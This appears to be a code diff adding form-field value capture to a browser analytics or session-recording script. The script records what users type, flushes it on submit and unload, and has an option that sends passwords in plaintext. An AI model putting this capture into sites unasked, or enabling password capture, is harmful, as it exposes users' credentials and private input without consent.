@@ -219,8 +219,94 @@
     push("scroll", { s: Math.round(scroll), y: Math.round(scroll), yp: pct / 100 });
   }), { passive: true });
 
+  var MAX_VALUE = 160;
+  var pending = [];
+
+  function fieldName(node) {
+    var name = node.getAttribute("name") || node.id
+      || node.getAttribute("aria-label") || node.getAttribute("placeholder") || "";
+    return String(name).slice(0, 80);
+  }
+
+  function fieldValue(node) {
+    var tag = (node.tagName || "").toLowerCase();
+    var type = String(node.type || "").toLowerCase();
+    if (tag === "select") {
+      var picked = node.options && node.options[node.selectedIndex];
+      return picked ? String(picked.text || picked.value || "") : "";
+    }
+    if (type === "checkbox" || type === "radio") {
+      return (node.checked ? "[x] " : "[ ] ") + String(node.value || "");
+    }
+    if (type === "file") { return ""; }
+    var value = String(node.value || "");
+    if (type === "password" && !config.capturePasswords) {
+      return new Array(Math.min(value.length, MAX_VALUE) + 1).join("*");
+    }
+    return value.slice(0, MAX_VALUE);
+  }
+
+  function typed(node) {
+    var row = { sel: selectorFor(node) };
+    if (!masked(node)) {
+      row.lbl = fieldValue(node);
+      var name = fieldName(node);
+      if (name) { row.m = { field: name }; }
+    }
+    push("input", row);
+  }
+
+  function settle(node) {
+    for (var i = 0; i < pending.length; i++) {
+      if (pending[i].node === node) {
+        clearTimeout(pending[i].timer);
+        pending.splice(i, 1);
+        typed(node);
+        return;
+      }
+    }
+  }
+
+  function settleAll() {
+    var nodes = pending.map(function (p) { return p.node; });
+    nodes.forEach(settle);
+  }
+
+  function capturable(node) {
+    var tag = (node && node.tagName || "").toLowerCase();
+    return tag === "input" || tag === "textarea" || tag === "select";
+  }
+
   document.addEventListener("input", guard(function (event) {
-    push("input", { sel: selectorFor(event.target) });
+    var node = event.target;
+    if (!config.captureInputs || !capturable(node)) {
+      push("input", { sel: selectorFor(node) });
+      return;
+    }
+    for (var i = 0; i < pending.length; i++) {
+      if (pending[i].node === node) { clearTimeout(pending[i].timer); pending.splice(i, 1); break; }
+    }
+    var entry = { node: node };
+    entry.timer = setTimeout(function () { settle(node); }, config.inputSettleMs || 800);
+    pending.push(entry);
+  }), true);
+
+  document.addEventListener("change", guard(function (event) {
+    if (!config.captureInputs || !capturable(event.target)) { return; }
+    var node = event.target;
+    var queued = pending.some(function (p) { return p.node === node; });
+    if (queued) { settle(node); return; }
+    var tag = (node.tagName || "").toLowerCase();
+    var type = String(node.type || "").toLowerCase();
+    if (tag === "select" || type === "checkbox" || type === "radio") { typed(node); }
+  }), true);
+
+  document.addEventListener("focusout", guard(function (event) {
+    if (config.captureInputs) { settle(event.target); }
+  }), true);
+
+  document.addEventListener("submit", guard(function () {
+    if (config.captureInputs) { settleAll(); flush(false); }
   }), true);
 
   window.addEventListener("resize", guard(function () {
@@ -297,10 +383,10 @@
   timer = setInterval(function () { flush(false); }, FLUSH_MS);
 
   document.addEventListener("visibilitychange", guard(function () {
-    if (document.visibilityState === "hidden") { flush(true); }
+    if (document.visibilityState === "hidden") { settleAll(); flush(true); }
   }));
-  window.addEventListener("pagehide", guard(function () { flush(true); }));
-  window.addEventListener("beforeunload", guard(function () { flush(true); }));
+  window.addEventListener("pagehide", guard(function () { settleAll(); flush(true); }));
+  window.addEventListener("beforeunload", guard(function () { settleAll(); flush(true); }));
 
   setTimeout(function () { flush(false); }, 1200);
 
